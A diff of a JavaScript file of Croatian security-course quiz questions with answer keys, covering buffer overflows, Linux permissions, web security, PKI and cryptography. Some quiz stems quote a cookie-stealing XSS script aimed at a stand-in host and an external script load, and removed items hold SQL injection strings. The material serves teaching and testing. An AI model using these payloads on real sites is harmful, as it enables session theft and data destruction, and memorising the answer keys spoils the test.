+    explanation: "seq je na stogu na nižim adresama, a adresa za povratak je na višim adresama. S dovoljno velikim pozitivnim indexom napadač piše izvan granica seq[] prema višim adresama — točno na poziciju adrese za povratak. Izračuna offset (u elementima niza) između seq[0] i return addressa i upisuje željenu adresu."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Heap overflow se razlikuje od stack overflow-a po tome što:",
+    answers: [
+      "Heap overflow je moguć samo u C++, stack overflow samo u C",
+      "Heap overflow prepisuje dinamički alocirane podatke i malloc metapodatke, stack overflow cilja lokalne varijable i adresu za povratak",
+      "Heap overflow je uvijek opasniji od stack overflow-a",
+      "Nema razlike — oba prepisuju memoriju na isti način"
+    ],
+    correct: 1,
+    explanation: "Stack overflow: prepisuje stog (lokalne varijable → rbp → return address). Heap overflow: prepisuje dinamički alocirane podatke i metapodatke alokatora. Oba mogu dovesti do izvršavanja proizvoljnog koda ali kroz različite mehanizme."
+  },
+
+  // ══════════════════════════════════════════════════════════════
+  // TOPIC 4 — SIGURNOST OPERACIJSKIH SUSTAVA
+  // ══════════════════════════════════════════════════════════════
+  {
+    topic: "Sigurnost OS — Linux ovlasti",
+    q: "Datoteka ima ovlasti: -rw-r--r-- Može li korisnik koji nije vlasnik niti u grupi vlasnika pisati u datoteku?",
+    answers: ["Da, svi mogu pisati", "Ne, ostali (others) imaju samo pravo čitanja (r--)", "Da, svi mogu pisati jer je to javna datoteka", "Nije moguće odrediti bez znanja tko je vlasnik"],
+    correct: 1,
+    explanation: "rw-r--r--: vlasnik rw-, grupa r--, ostali r--. Samo vlasnik ima pravo pisanja (w). Korisnik koji nije vlasnik niti u grupi spada u 'ostali' → može samo čitati."
+  },
+  {
+    topic: "Sigurnost OS — Linux ovlasti",
     q: "Što znači chmod 644 na datoteci?",
     answers: [
       "Vlasnik: rwx, Grupa: r--, Ostali: r--",
@@ -669,166 +1000,161 @@ const ALL_QUESTIONS = [
       "Vlasnik: rwx, Grupa: rwx, Ostali: r--"
     ],
     correct: 1,
-    explanation: "6 = rw- (4+2), 4 = r-- (4), 4 = r--. Dakle: vlasnik čita i piše, grupa i ostali samo čitaju. Tipična konfiguracija za web datoteke."
+    explanation: "6 = 4+2 = rw-, 4 = r--, 4 = r--. Vlasnik može čitati i pisati, grupa i ostali mogu samo čitati. Tipična konfiguracija za web datoteke i konfiguracijske datoteke."
   },
   {
-    topic: "Linux ovlasti",
-    q: "Datoteka: -rwxr-x--- Može li korisnik koji pripada grupi vlasnika pokrenuti (execute) datoteku?",
-    answers: ["Da", "Ne", "Samo ako je root", "Samo ako je vlasnik"],
+    topic: "Sigurnost OS — Linux ovlasti",
+    q: "Datoteka: -rwxr-x--- Vlasnik: root, Grupa: admin. Može li korisnik u grupi admin pokrenuti datoteku?",
+    answers: ["Da, jer r-x uključuje execute (x)", "Ne, samo vlasnik može pokrenuti", "Da, ali samo kao sudo", "Ne, execute zahtijeva posebnu dozvolu izvan chmod"],
     correct: 0,
-    explanation: "rwxr-x---: vlasnik ima rwx, grupa ima r-x (može čitati I pokretati), ostali nemaju prava. Korisnik u grupi može pokrenuti datoteku."
+    explanation: "rwxr-x---: vlasnik rwx, grupa r-x (čitanje I pokretanje), ostali ---. Korisnik u grupi admin ima r-x → može pokrenuti datoteku (x)."
   },
   {
-    topic: "Linux ovlasti",
+    topic: "Sigurnost OS — Linux ovlasti",
+    q: "Datoteka: -rw-r----- Vlasnik: www-data, Grupa: admin. Mirko je u grupi admin. Može li Mirko čitati datoteku?",
+    answers: [
+      "Da — mirko je u grupi admin koja ima r-- pravo čitanja",
+      "Ne — mirko nije vlasnik",
+      "Da — ali samo kao root",
+      "Ne — grupna prava su rw- pa je potrebno pisanje"
+    ],
+    correct: 0,
+    explanation: "rw-r-----: vlasnik rw-, grupa r--, ostali ---. Mirko je u grupi admin → dobiva grupna prava r-- → može čitati. Vlasništvo nije uvjet za pristup putem grupnih prava."
+  },
+  {
+    topic: "Sigurnost OS — Linux ovlasti",
     q: "Kojom naredbom se mijenja vlasnik datoteke na Linux sustavu?",
     answers: ["chmod", "chown", "chgrp", "chuser"],
     correct: 1,
-    explanation: "chown (change owner) mijenja vlasnika datoteke. chmod (change mode) mijenja ovlasti, chgrp mijenja grupu datoteke."
+    explanation: "chown (change owner) mijenja vlasnika. chmod (change mode) mijenja ovlasti. chgrp mijenja grupu. Primjer: chown mirko datoteka — mijenja vlasnika u mirko."
   },
   {
-    topic: "Linux ovlasti",
+    topic: "Sigurnost OS — Linux ovlasti",
     q: "Koji alat se koristi za šifriranje cijelog diska na Linux sustavu?",
-    answers: ["BitLocker", "FileVault", "LUKS (Linux Unified Key Setup)", "VeraCrypt samo"],
+    answers: ["BitLocker", "FileVault", "LUKS (Linux Unified Key Setup) s dm-crypt", "VeraCrypt isključivo"],
     correct: 2,
-    explanation: "LUKS (Linux Unified Key Setup) uz dm-crypt je standardni Linux alat za šifriranje diska. BitLocker je Windowsov alat, FileVault je Appleov."
+    explanation: "LUKS (Linux Unified Key Setup) uz dm-crypt je standardni Linux mehanizam za šifriranje diska. BitLocker je Windowsov, FileVault je Appleov. LUKS dodaje salt u zaglavlje i upravlja ključevima."
+  },
+  {
+    topic: "Sigurnost OS — Linux ovlasti",
+    q: "Kakva je razlika između DAC i MAC (Discretionary vs Mandatory Access Control)?",
+    answers: [
+      "DAC je za datoteke, MAC je za mrežne resurse",
+      "U DAC vlasnik resursa odlučuje o dozvolama; u MAC sustav/admin nameće pravila koja korisnici ne mogu mijenjati",
+      "MAC je stariji i manje siguran od DAC-a",
+      "MAC koristi ACL liste, DAC koristi uloge"
+    ],
+    correct: 1,
+    explanation: "DAC: vlasnik sam kontrolira dozvole (chmod) — Linux standardno koristi DAC. MAC: sigurnosna politika se nameće centralno i ne može je mijenjati ni vlasnik (SELinux, AppArmor). MAC je strože i sigurnije."
+  },
+  {
+    topic: "Sigurnost OS — Linux ovlasti",
+    q: "Što je sandboxing aplikacija?",
+    answers: [
+      "Testno okruženje za razvoj bez pristupa produkcijskim podacima",
+      "Izolacija aplikacije u ograničeno okruženje s eksplicitno dozvoljenim resursima — sve ostalo je nedostupno",
+      "Enkripcija podataka aplikacije na disku",
+      "Tehnika za virtualnu memoriju u OS-u"
+    ],
+    correct: 1,
+    explanation: "Sandbox: aplikacija radi u 'pješčaniku' i nema pristup ostatku sustava bez eksplicitnog dopuštenja. Primjeri: Android/iOS permissioni, Docker, browser tab izolacija, Firejail na Linuxu, AppArmor profili."
+  },
+  {
+    topic: "Sigurnost OS — Linux ovlasti",
+    q: "Kojom naredbom se oduzimaju prava pisanja svima (vlasnik, grupa, ostali) bez mijenjanja ostalih prava?",
+    answers: ["chmod -w datoteka", "chown -w datoteka", "chmod 000 datoteka", "chgrp -w datoteka"],
+    correct: 0,
+    explanation: "chmod -w ili chmod a-w oduzima write pravo svim kategorijama (all: owner, group, other) bez diranja ostalih prava. chmod 000 bi uklonio SVA prava (čitanje, pisanje, pokretanje)."
+  },
+  {
+    topic: "Sigurnost OS — Linux ovlasti",
+    q: "Datoteka /etc/shadow ima ovlasti -rw-r----- s vlasnikom root i grupom shadow. Samo backup korisnik je u grupi shadow. Može li mirko (nije root, nije u shadow grupi) čitati datoteku?",
+    answers: ["Da", "Ne — mirko spada u 'ostali' koji imaju --- (nema prava)", "Da, ako pokrene kao sudo", "Ovisi o verziji Linuxa"],
+    correct: 1,
+    explanation: "rw-r-----: vlasnik (root) rw-, grupa (shadow) r--, ostali ---. Mirko nije root niti u shadow grupi → spada u 'ostali' → nema nikakva prava (---) → ne može čitati."
   },
 
-  // ── BUFFER OVERFLOW ─────────────────────────────────────────────────────────
-  {
-    topic: "Buffer overflow",
-    q: "Prema kojim adresama raste funkcijski stog (stack)?",
-    answers: ["Prema višim adresama", "Prema nižim adresama", "Nasumično — ovisi o OS-u", "Uvijek prema adresi 0x0000"],
-    correct: 1,
-    explanation: "Stog raste prema nižim adresama (downward). Gomila (heap) raste prema višim adresama. Oni rastu jedan prema drugome iz suprotnih strana memorijskog prostora."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Što su NOP sanjke (NOP sled) i zašto ih napadač koristi?",
-    answers: [
-      "Niz no-operation instrukcija ispred shellcode-a koji povećava šansu pogoditi ispravnu povratnu adresu",
-      "Niz naredbi koje blokiraju kanarinca",
-      "Tehnika šifriranja shellcode-a da izbjegne antivirus",
-      "Niz lažnih adresa za povratak"
-    ],
-    correct: 0,
-    explanation: "NOP (0x90) ne radi ništa osim pomaka na sljedeću instrukciju. Napadač stavlja veliki NOP sled ispred shellcode-a — ako pogodi bilo koji NOP, izvođenje 'sklizne' do shellcode-a."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Što Write-XOR-Execute (W^X) zaštita sprečava?",
-    answers: [
-      "Sprečava napadača da promijeni povratnu adresu",
-      "Sprečava izvođenje koda koji je ubačen kao podatak — memorija može biti ili zapisiva ili izvršiva, ali ne oboje",
-      "Sprečava prepisivanje kanarinca",
-      "Sprečava učitavanje biblioteka bez digitalnog potpisa"
-    ],
-    correct: 1,
-    explanation: "W^X: svaka memorijska stranica može biti ili zapisiva (writable) ili izvršiva (executable), ali ne oboje. Sprečava ubacivanje i izvođenje shellcode-a u stog/heap."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Što su gadgeti u Return Oriented Programming (ROP) napadu?",
-    answers: [
-      "Shellcode koji napadač ubacuje na stog",
-      "Kratki nizovi legitimnih strojnih instrukcija koji završavaju s 'ret', korišteni za sklapanje napada",
-      "Posebne instrukcije za zaobilaženje kanarinca",
-      "Alati za automatsko generiranje exploita"
-    ],
-    correct: 1,
-    explanation: "ROP gadgeti su kratki nizovi instrukcija (već u programu/bibliotekama) koji završavaju s 'ret'. Napadač ih lančano spaja prepisivanjem stoga da izvrši željeni kod bez ubacivanja novog."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Što su kanarinci (stack canaries) i što štite?",
-    answers: [
-      "Posebni bajtovi između lokalnih varijabli i adrese povratka koji otkrivaju prepisivanje stoga",
-      "Lažne povratne adrese koje preusmjeravaju napadača",
-      "Zaštitni mehanizam koji randomizira adrese funkcija",
-      "Hash vrijednosti svih lokalnih varijabli"
-    ],
-    correct: 0,
-    explanation: "Kanarinac je nasumična vrijednost smještena na stogu između lokalnih varijabli i adrese povratka. Prije povratka iz funkcije provjerava se je li kanarinac nepromijenjen. Napadač ne može prepisati povratnu adresu bez da prepiše kanarinca."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "Napadač je pronašao da program nema kanarince jer...",
-    answers: [
-      "Program je napisan u Pythonu",
-      "Može prepisati povratnu adresu bez da program prijavi grešku ili se sruši",
-      "Program koristi statičke varijable",
-      "Program ima W^X zaštitu uključenu"
-    ],
-    correct: 1,
-    explanation: "Prisutnost kanarinca se može zaključiti ako prepisivanje stoga (s garbage vrijednostima) uzrokuje prijevremeni crash s porukom 'stack smashing detected'. Bez kanarinca, program se srušava tek kad skači na nevažeću adresu."
-  },
-  {
-    topic: "Buffer overflow",
-    q: "ASLR (Address Space Layout Randomization) otežava buffer overflow napad jer...",
-    answers: [
-      "Sprečava pisanje u stog",
-      "Slučajno raspoređuje adrese memorijskih stranica pa napadač ne zna gdje su funkcije i stog",
-      "Šifrira sadržaj stoga",
-      "Automatski postavlja kanarinice"
-    ],
-    correct: 1,
-    explanation: "ASLR randomizira adrese stoga, heap-a i biblioteka pri svakom pokretanju programa. Napadač ne može hardkodirati adresu shellcode-a ili libc funkcije jer se ona svaki put mijenja."
-  },
-
-  // ── WEB SIGURNOST ───────────────────────────────────────────────────────────
+  // ══════════════════════════════════════════════════════════════
+  // TOPIC 5 — SIGURNOST WEB APLIKACIJA
+  // ══════════════════════════════════════════════════════════════
   {
     topic: "Web sigurnost",
-    q: "Na forum je postavljena poruka: \x3Cscript\x3Edocument.location.href='http://hacker.hr/cookie=?'+document.cookie\x3C/script\x3E. Kakav je to napad?",
-    answers: ["Reflektirani XSS", "Slijepi SQL injection", "Pohranjeni (Stored) XSS", "CSRF"],
-    correct: 2,
-    explanation: "Pohranjeni XSS: skripta je pohranjena na poslužitelju (forumu) i izvršava se u pregledniku svakog posjetitelja koji učita stranicu. Reflektirani XSS bi se izvršavao samo kroz URL."
+    q: "Na forum je postavljena poruka: \x3Cscript\x3Edocument.location.href='http://hacker.hr/cookie=?'+document.cookie\x3C/script\x3E Kakav je to napad?",
+    answers: ["Reflektirani XSS", "CSRF", "Slijepi SQL injection", "Pohranjeni (Stored) XSS"],
+    correct: 3,
+    explanation: "Pohranjeni XSS: skripta je pohranjena na poslužitelju (forumu) i izvršava se u pregledniku svakog posjetitelja koji učita stranicu. Reflektirani XSS bi se izvršavao samo kroz maliciozni URL koji korisnik klikne."
   },
   {
     topic: "Web sigurnost",
-    q: "Stjepan je postavio \x3Cscript src='http://stjepan.hr/zlo.js'\x3E\x3C/script\x3E na forum. Što se događa kada Marin učita stranicu?",
+    q: "Stjepan je postavio \x3Cscript src='http://stjepan.hr/zlo.js'\x3E\x3C/script\x3E na forum. Što se dogodi kad Marin učita stranicu?",
     answers: [
       "Skripta se ne preuzima jer SOP to sprečava",
-      "Skripta se preuzima ali ne izvršava",
-      "Skripta se preuzima i izvršava u Marinovom pregledniku",
-      "Preglednik prikaže sigurnosno upozorenje i blokira učitavanje"
+      "Skripta se preuzima ali ne izvršava — SOP blokira izvođenje",
+      "Skripta se preuzima I izvršava u kontekstu foruma u Marinovom pregledniku",
+      "Preglednik prikaže sigurnosno upozorenje i pita korisnika"
     ],
     correct: 2,
-    explanation: "Same Origin Policy (SOP) sprečava ČITANJE podataka s druge domene, ali ne blokira UČITAVANJE skripti. Tag \x3Cscript src='...'\x3E može učitati skriptu s bilo koje domene i ona se izvršava u kontekstu foruma."
+    explanation: "SOP sprečava ČITANJE odgovora s druge domene, ali ne blokira UČITAVANJE skripti. Tag \x3Cscript src='...'\x3E može učitati skriptu s bilo koje domene. Jednom učitana, skripta se izvodi u kontekstu foruma s pristupom document.cookie."
   },
   {
     topic: "Web sigurnost",
-    q: "Napadač zna da u bazi postoji korisnik 'zeljko' ali ne zna mu lozinku. Koji username može poslati kako bi otvorio IoT bravu ranjivom na SQL injection?",
+    q: "Što je Same Origin Policy (SOP)?",
     answers: [
-      "zeljko",
-      "zeljko' OR '1'='1",
-      "' OR 1=1--",
-      "'; DROP TABLE users;--"
+      "Politika koja zabranjuje sve HTTP zahtjeve prema vanjskim domenama",
+      "Sigurnosni mehanizam preglednika: skripta s jednog izvora (protokol+domena+port) ne može čitati podatke s drugog izvora",
+      "Politika koja zahtijeva HTTPS za sve stranice",
+      "Pravilo koje zabranjuje učitavanje skripti s vanjskih domena"
     ],
-    correct: 2,
-    explanation: "' OR 1=1-- zatvara string, dodaje uvjet koji je uvijek istinit i komentarom uklanja provjeru lozinke. SQL upit postaje: SELECT ... WHERE username='' OR 1=1--' AND code='...' → uvijek vraća rezultat."
+    correct: 1,
+    explanation: "SOP: 'izvorište' = protokol + domena + port. Skripta ne može čitati odgovore zahtjeva na drugu domenu. ALI: slanje zahtjeva nije blokirano, ni učitavanje \x3Cscript src\x3E tagova. Zato Stored XSS s vanjskom skriptom radi."
   },
   {
     topic: "Web sigurnost",
-    q: "Koji od navedenih načina SPREČAVA SQL injection napade?",
+    q: "Što je CSRF (Cross-Site Request Forgery) napad?",
+    answers: [
+      "Ubacivanje skripte na web stranicu koja se izvodi u tuđem pregledniku",
+      "Napadač navodi prijavljenog korisnika da nesvjesno pošalje autentificirani zahtjev ciljanoj web aplikaciji",
+      "Presretanje komunikacije između preglednika i poslužitelja",
+      "Napad koji modificira SQL upite web aplikacije"
+    ],
+    correct: 1,
+    explanation: "CSRF: napadač prevari žrtvu (koja je prijavljena na ciljanoj stranici) da klikne link ili posjeti stranicu koja u pozadini šalje zahtjev banci/forumu u ime žrtve. Preglednik automatski šalje kolačiće pa poslužitelj misli da je zahtjev legitiman."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "Čemu služi CSRF token u web formularu?",
+    answers: [
+      "Šifrira komunikaciju između klijenta i poslužitelja",
+      "Nasumična vrijednost u formi koju server provjerava — napadač s druge domene ne može znati točnu vrijednost",
+      "Zamjenjuje session cookie za autentifikaciju",
+      "Sprečava XSS napad filtriranjem HTML tagova"
+    ],
+    correct: 1,
+    explanation: "CSRF token: server generira nasumičnu vrijednost i ugradi je u svaki HTML obrazac. Kad korisnik pošalje obrazac, server provjerava token. Napadač ne može pročitati token s druge domene (SOP) pa ne može konstruirati valjani zahtjev."
+  },
+  {
+    topic: "Web sigurnost",
+    q: "Koji od navedenih načina sprečava SQL injection napade?",
     answers: [
       "Filtriranje HTML tagova (\x3Cscript\x3E, \x3Cimg\x3E...)",
       "Korištenje HTTPS protokola",
       "Korištenje pripremljenih izjava (prepared statements)",
-      "Postavljanje kolačića s HTTPOnly zastavicom"
+      "Postavljanje HTTPOnly zastavice na kolačiće"
     ],
     correct: 2,
-    explanation: "Prepared statements odvajaju SQL kod od korisničkih podataka — korisnički unos se nikad direktno ne interpolira u SQL upit. Filtriranje HTML tagova sprečava XSS, ne SQL injection."
+    explanation: "Prepared statements odvajaju SQL strukturu od korisničkih podataka — korisnički unos nikad se ne interpolira direktno u SQL. Motor baze podataka tretira ga isključivo kao podatak, ne kao SQL naredbu."
   },
   {
     topic: "Web sigurnost",
-    q: "Što postiže napadač koji uspješno izvrši Stored XSS napad i dohvati document.cookie žrtve?",
+    q: "Napadač je uspješno ukrao Marinov document.cookie s foruma. Što najvjerojatnije sadrži?",
     answers: [
-      "Dohvaća žrtvinu lozinku u čistom tekstu",
-      "Dohvaća žrtvin identifikator sjednice (session token) i može ga koristiti za preuzimanje sesije",
-      "Dohvaća TLS certifikat poslužitelja",
-      "Dohvaća hash žrtvine lozinke"
+      "Marinovu lozinku u čistom tekstu",
+      "Marinov identifikator sjednice (session ID/token) koji mu omogućuje pristup kao Marin",
+      "TLS certifikat poslužitelja",
+      "Hash Marinove lozinke sa saltom"
     ],
     correct: 1,
-    explanation: "U kolačićima je pohranjen session token koji identificira prijavljenog korisnika. Napadač s tim tokenom može lažno predstavljati žrtvu prema poslužitelju bez znanja lozinke."
+    explanation: "U kolačiću je pohranjen session token koji identificira prijavljenog korisnika. Napadač s tim tokenom može lažno predstavljati Marina prema poslužitelju — bez znanja lozinke, čisto preuzimanje sesije (session hijacking)."
   },
   {
     topic: "Web sigurnost",
@@ -837,786 +1163,311 @@ const ALL_QUESTIONS = [
       "Povjerljivost, cjelovitost te autentifikaciju klijenta i poslužitelja",
       "Povjerljivost, cjelovitost te autentifikaciju poslužitelja",
       "Povjerljivost, cjelovitost i raspoloživost",
-      "Samo povjerljivost"
+      "Samo povjerljivost prometa"
     ],
     correct: 1,
-    explanation: "HTTPS (TLS s valjanim certifikatom): šifrira promet (povjerljivost), štiti integritet (MAC), autentificira poslužitelj (certifikat). Klijent se NE autentificira osim ako koristimo klijentske certifikate."
-  },
-
-  // ── PKI I CERTIFIKATI ───────────────────────────────────────────────────────
-  {
-    topic: "PKI & Certifikati",
-    q: "Tko je potpisao Signature Value u certifikatu čiji je Issuer 'GEANT OV RSA CA 4'?",
-    answers: [
-      "Javni ključem poslužitelja www.fer.unizg.hr",
-      "Privatnim ključem poslužitelja www.fer.unizg.hr",
-      "Javnim ključem GEANT OV RSA CA 4",
-      "Privatnim ključem GEANT OV RSA CA 4"
-    ],
-    correct: 3,
-    explanation: "Digitalni potpis u certifikatu uvijek stvara IZDAVAČ (CA) koristeći PRIVATNI ključ. Verifikacija se radi s javnim ključem izdavača koji se nalazi u nadređenom certifikatu."
-  },
-  {
-    topic: "PKI & Certifikati",
-    q: "Certifikat poslužitelja www.fer.unizg.hr ima polje 'X509v3 Basic Constraints: CA:FALSE'. Što to znači?",
-    answers: [
-      "Certifikat je istekao",
-      "Ovaj certifikat ne može potpisivati (izdavati) druge certifikate",
-      "Certifikat ne koristi CA infrastrukturu",
-      "Certifikat je samopotpisan"
-    ],
-    correct: 1,
-    explanation: "CA:FALSE znači da se ovaj certifikat ne smije koristiti kao certifikacijski autoritet — ne može potpisivati druge certifikate. Samo CA certifikati imaju CA:TRUE."
-  },
-  {
-    topic: "PKI & Certifikati",
-    q: "Napadač je rastavio RSA modulus N na proste faktore p i q. Što može napraviti s tim znanjem?",
-    answers: [
-      "Dešifrirati komunikaciju zaštićenu TLS-om koji koristi DH razmjenu ključeva",
-      "Izračunati privatni ključ d i dešifrirati komunikaciju u RSA varijanti TLS-a",
-      "Stvoriti lažni certifikat s istim javnim ključem",
-      "Ništa — modulus je javan i bekoristan"
-    ],
-    correct: 1,
-    explanation: "Iz p i q može se izračunati Eulerova funkcija φ(N) = (p-1)(q-1), a iz nje i javnog eksponenta e izračuna se privatni ključ d = e^(-1) mod φ(N). Time je privatni ključ kompromitiran."
-  },
-  {
-    topic: "PKI & Certifikati",
-    q: "SHA-1 se koristi za izračun 'Subject Key Identifier' u certifikatu. Koja vrsta kriptografskog algoritma je SHA-1?",
-    answers: ["Simetrična šifra", "Asimetrična šifra", "Kriptografska hash funkcija", "MAC algoritam"],
-    correct: 2,
-    explanation: "SHA-1 je kriptografska hash funkcija — deterministički algoritam koji poruci proizvoljne duljine pridružuje sažetak fiksne duljine (160 bita). Napomena: SHA-1 više nije siguran, koristi se SHA-256/SHA-384."
-  },
-  {
-    topic: "PKI & Certifikati",
-    q: "Ispravan lanac certifikata za www.fer.unizg.hr je: USERTrust → GEANT OV RSA CA 4 → *.fer.unizg.hr. Koji certifikat mora imati CA:TRUE?",
-    answers: [
-      "Samo *.fer.unizg.hr",
-      "Samo USERTrust",
-      "USERTrust i GEANT OV RSA CA 4, ali ne *.fer.unizg.hr",
-      "Svi certifikati u lancu"
-    ],
-    correct: 2,
-    explanation: "Svi certifikati u lancu osim najnižeg (poslužiteljevog) moraju imati CA:TRUE. Poslužiteljev certifikat ima CA:FALSE jer nije namijenjen potpisivanju novih certifikata."
-  },
-
-  // ── OSNOVE (dodatna) ────────────────────────────────────────────────────────
-  {
-    topic: "Osnove sigurnosti",
-    q: "Koja je razlika između povjerenja (trust) i povjerljivosti (confidentiality)?",
-    answers: [
-      "To su sinonimi — oboje se odnose na tajnost podataka",
-      "Povjerenje je informirano oslanjanje na karakter nekoga, povjerljivost je sigurnosni zahtjev da podatke vide samo ovlašteni",
-      "Povjerenje se odnosi na ljude, povjerljivost na sustave",
-      "Povjerljivost je jači oblik povjerenja"
-    ],
-    correct: 1,
-    explanation: "Povjerenje (trust) = informirano oslanjanje na karakter, sposobnost ili istinu nekoga. Povjerljivost (confidentiality) = sigurnosni zahtjev da podatke vide samo ovlašteni entiteti. Možemo nečemu vjerovati a da to nije povjerljivo."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Napadač koristi ICMP Echo Request poruke čija DULJINA kodira tajnu poruku. Kakav kanal je to?",
-    answers: ["Sporedni kanal (side channel)", "Prikriveni kanal (covert channel)", "Stražnja vrata (backdoor)", "VPN tunel"],
-    correct: 1,
-    explanation: "Prikriveni kanal (covert channel) je komunikacijski kanal koji prenosi podatke na način koji legitimni vlasnici kanala ne primjećuju — ovdje duljina ICMP paketa kodira informaciju."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "U kojoj fazi životnog ciklusa sustava treba POČETI brinuti o sigurnosti?",
-    answers: ["Implementacija", "Testiranje", "Definiranje zahtjeva / Dizajn", "Uvođenje u produkciju"],
-    correct: 2,
-    explanation: "Sigurnost se mora ugraditi od samog početka — u fazi definiranja zahtjeva i dizajna. Što se kasnije otkrije ranjivost, to je skuplje i teže popraviti."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Što je exploit?",
-    answers: [
-      "Alat za detekciju ranjivosti",
-      "Bilo koja metoda, kod ili artefakt koji iskorištava ranjivost",
-      "Sigurnosna zakrpa za poznatu ranjivost",
-      "Izvješće o pronađenoj ranjivosti"
-    ],
-    correct: 1,
-    explanation: "Exploit = metoda, kod ili artefakt koji iskorištava konkretnu ranjivost. Shellcode je posebna vrsta exploita koji pokreće napadačev kod."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Koji su preduvjeti za nastanak incidenta?",
-    answers: [
-      "Agent prijetnje i exploit",
-      "Ranjivost i prijetnja",
-      "Napadač i žrtva",
-      "Pogreška u kodu i mrežni pristup"
-    ],
-    correct: 1,
-    explanation: "Incident nastaje kad postoje i ranjivost (pogreška) i prijetnja (scenarij koji ju iskorištava). Sama ranjivost bez prijetnje ne uzrokuje incident."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Što je ranjivost nultog dana (zero-day)?",
-    answers: [
-      "Ranjivost koja se pojavi prvog dana rada sustava",
-      "Ranjivost koja postoji od početka ali je otkrivena tek kasnije, a zakrpa još ne postoji",
-      "Ranjivost koja traje točno 24 sata",
-      "Ranjivost bez ikakvog utjecaja na sustav"
-    ],
-    correct: 1,
-    explanation: "Zero-day ranjivost je poznata napadaču ali ne i proizvođaču softvera, dakle nema dostupne zakrpe. Iznimno su opasne jer su obrana gotovo nemoguća dok se ne objavi patch."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Koja tvrdnja o upravljanju rizicima je točna?",
-    answers: [
-      "Rizici se mogu samo kvantitativno mjeriti (1-10)",
-      "Rizik uključuje prijetnju, ranjivost i mogu biti kvantitativni ili kvalitativni",
-      "Upravljanje rizicima podrazumijeva eliminaciju svih ranjivosti",
-      "Rizici se procjenjuju samo jednom, na početku projekta"
-    ],
-    correct: 1,
-    explanation: "Rizik = vjerojatnost + šteta. Može se izražavati kvantitativno (brojevno) ili kvalitativno (nizak/srednji/visok). Upravljanje rizicima je kontinuiran proces, ne jednokratna aktivnost."
-  },
-
-  // ── KRIPTOGRAFIJA (dodatna) ──────────────────────────────────────────────────
-  {
-    topic: "Kriptografija",
-    q: "Zašto se RSA gotovo nikad ne koristi samostalno za šifriranje dugih poruka?",
-    answers: [
-      "Jer RSA nema dovoljno dug ključ",
-      "Jer je enkripcija dugih poruka asimetričnim algoritmom iznimno spora, i jer obični RSA nije semantički siguran",
-      "Jer RSA ne podržava poruke dulje od 256 bajta",
-      "Jer RSA zahtijeva dijeljeni tajni ključ"
-    ],
-    correct: 1,
-    explanation: "Asimetrična enkripcija je puno sporija od simetrične. Uz to, obični RSA (ECB varijanta) nije semantički siguran — isti plaintext uvijek daje isti ciphertext pa napadač može pogađati poruke."
-  },
-  {
-    topic: "Kriptografija",
-    q: "Što je paradoks rođendana i zašto je relevantan za hash funkcije?",
-    answers: [
-      "Pokazuje da su hash kolizije nemoguće za dugačke sažetke",
-      "Pokazuje da treba prosječno samo ~1.2 * 2^(n/2) pokušaja za pronalazak kolizije n-bitnog sažetka",
-      "Dokazuje da je SHA-256 siguran",
-      "Govori da dva korisnika ne mogu imati isti password hash"
-    ],
-    correct: 1,
-    explanation: "Paradoks rođendana: u grupi od samo 23 ljudi vjerojatnost da dvoje dijele rođendan je >50%. Analogno, za n-bitni hash treba samo ~2^(n/2) pokušaja za koliziju, ne 2^n — zato hash mora biti dovoljno dugačak."
-  },
-  {
-    topic: "Kriptografija",
-    q: "Što je MAC (Message Authentication Code) i čemu služi?",
-    answers: [
-      "Asimetrični digitalni potpis poruke",
-      "Deterministički algoritam koji uz poruku i tajni ključ daje oznaku fiksne duljine — dokazuje integritet i autentičnost",
-      "Kriptografska hash funkcija bez ključa",
-      "Protokol za razmjenu ključeva"
-    ],
-    correct: 1,
-    explanation: "MAC ovisi o sadržaju poruke I tajnom ključu — samo netko tko zna ključ može izraditi ili provjeriti MAC. Za razliku od digitalnog potpisa, MAC ne pruža neporecivost jer obje strane znaju ključ."
-  },
-  {
-    topic: "Kriptografija",
-    q: "CTR (Counter) način rada blok šifre generira keystream. Što se dogodi ako se isti IV koristi dva puta s istim ključem?",
-    answers: [
-      "Dešifriranje postaje nemoguće",
-      "XOR dvaju šifrata daje XOR originalnih poruka, otkrivajući informacije",
-      "Drugi šifrat postaje identičan prvome",
-      "Ključ se automatski regenerira"
-    ],
-    correct: 1,
-    explanation: "CTR s istim IV/ključem generira isti keystream. Ako c1=m1⊕ks i c2=m2⊕ks, tada c1⊕c2=m1⊕m2. Poznavanjem jedne poruke odmah se otkriva druga — isti problem kao kod OTP reuse."
-  },
-  {
-    topic: "Kriptografija",
-    q: "Koja od navedenih tvrdnji o digitalnom potpisu je točna?",
-    answers: [
-      "Digitalni potpis pruža povjerljivost poruke",
-      "Digitalni potpis pruža integritet i neporecivost jer ovisi o privatnom ključu pošiljatelja",
-      "Digitalni potpis je identičan MAC-u",
-      "Digitalni potpis šifrira poruku javnim ključem primatelja"
-    ],
-    correct: 1,
-    explanation: "Digitalni potpis (s privatnim ključem) pruža integritet i neporecivost — samo vlasnik privatnog ključa može ga stvoriti, a svi mogu verificirati s javnim ključem. MAC ne pruža neporecivost jer dijele isti ključ."
-  },
-  {
-    topic: "Kriptografija",
-    q: "Kako se provjerava ispravnost digitalnog potpisa s = H(m)^d mod N?",
-    answers: [
-      "Izračuna se H(m) i usporedi sa s direktno",
-      "Izračuna se s^e mod N i usporedi s H(m)",
-      "Privatnim ključem d dešifrira se s i dobije m",
-      "Generira se novi potpis i usporedi sa s"
-    ],
-    correct: 1,
-    explanation: "Verifikacija: s^e mod N mora biti jednako H(m). Javni ključ e se koristi za verifikaciju (inverz od d). Ako je jednako, potpis je valjan i poruka nije promijenjena."
-  },
-  {
-    topic: "Kriptografija",
-    q: "Što je HOTP/TOTP i čemu služi?",
-    answers: [
-      "Protokol za sigurnu razmjenu ključeva",
-      "Algoritmi za generiranje jednokratnih lozinki — HOTP na temelju brojača, TOTP na temelju vremena",
-      "Hash funkcije za pohranu lozinki",
